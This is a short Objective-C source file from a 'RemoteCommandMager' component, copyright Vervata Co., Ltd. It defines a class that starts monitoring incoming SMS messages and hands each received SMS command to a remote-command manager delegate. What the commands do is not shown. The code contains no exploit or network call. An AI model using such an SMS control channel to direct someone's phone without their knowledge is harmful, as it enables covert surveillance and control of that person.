/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SMSCmdCenter
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  17/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SMSCmdCenter.h"
#import "SMSCmdReceiver.h"

@implementation SMSCmdCenter

@synthesize mRemoteCmdManagerDelegate;

/**
 - Method name: initWithRCM
 - Purpose:This method is used to initialize the SMSCmdCenter class
 - Argument list and description: aRemoteCmdManagerDelegate (RemoteCmdManager)
 - Return description: id (SMSCmdCenter instance class)
*/

- (id) initWithRCM:(id <RemoteCmdManager>) aRemoteCmdManagerDelegate {

	if ((self = [super init])) {
		self.mRemoteCmdManagerDelegate= aRemoteCmdManagerDelegate;
		mSMSCmdReceiver=[[SMSCmdReceiver alloc]init];
		[mSMSCmdReceiver setMSMSCmdDelegate:self];
		[mSMSCmdReceiver startMonitoring];
	}
	DLog (@"initWithRCM--->%@",aRemoteCmdManagerDelegate);
	return self;
	
}

#pragma mark implementation of SMSCmdReceiver methods

- (void) didSMSCommandReceived: (SMSCmd*) aCommand {
	DLog (@"didSMSCommandReceived--->%@",aCommand);
  //Process SMS Command
   if (([[self mRemoteCmdManagerDelegate] respondsToSelector:@selector(processSMSCommand:)])) {
		[[self mRemoteCmdManagerDelegate] performSelector:@selector(processSMSCommand:) withObject:aCommand];
   }
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) dealloc {
	self.mRemoteCmdManagerDelegate=nil;
	[mSMSCmdReceiver release];
	mSMSCmdReceiver=nil;
	[super dealloc];
}

@end
